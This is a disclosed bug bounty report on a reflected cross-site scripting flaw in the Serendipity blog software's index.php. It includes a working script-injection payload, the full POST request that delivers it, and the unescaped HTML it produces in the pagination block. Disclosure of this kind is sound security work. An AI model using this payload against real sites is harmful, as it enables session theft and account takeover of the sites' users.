# Reflected xss in Serendipity's /index.php

## Report Details
- **Report ID**: 374100
- **URL**: https://hackerone.com/reports/374100
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-06-30T00:27:29.148Z
- **Disclosed**: 2018-11-09T21:03:03.465Z

## Reporter
- **Username**: geeknik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: hannob

## Vulnerability Information
**Summary:** 
There exists a reflected xss threat in https://blog.fuzzing-project.org/index.php?frontpage. 

**Description:**
By setting the `serendipity%5bmultiCat%5d%5b%5d` POST input to `1'"()&%<%20><ScRiPt >prompt(1)</ScRiPt>` I'm able to trigger a JavaScript prompt box in versions of IE up to and including IE 11.

## Steps To Reproduce:
This POST request should replicate the issue:

```
POST /index.php?frontpage HTTP/1.1
Content-Length: 118
Content-Type: application/x-www-form-urlencoded
Referer: https://blog.fuzzing-project.org/
Cookie: s9y_320982y345h324j56e04069=78uvbj9fk2u4jyh562u3j46jdt81tod; serendipity[url]=1; serendipity[name]=ltociaay; serendipity[email]=bugbountyspam%40protonmail.com; serendipity[remember]=checked%3D%22checked%22
Host: blog.fuzzing-project.org
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

serendipity%5bisMultiCat%5d=Go%21&serendipity%5bmultiCat%5d%5b%5d=1'%22()%26%25<%20><ScRiPt%20>prompt(1)</ScRiPt>
```
And here we can see that is reflected back to us in Serendipity's pagination block:
```
<nav class="serendipity_pagination block_level">
        <h2 class="visuallyhidden">Pagination</h2>

        <ul class="clearfix">
                        <li class="info"><span>Page 1 of 3, totaling 34 entries</span></li>
                        <li class="prev">&nbsp;</li>
            <li class="next"><a href="https://blog.fuzzing-project.org/categories/1\'\"()&%<%20><ScRiPt >prompt(1)</ScRiPt>-multi/P2.html">next page &rarr;</a></li>
        </ul>
    </nav
```

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

## Impact

Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."

In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.

## Attachments
No attachments
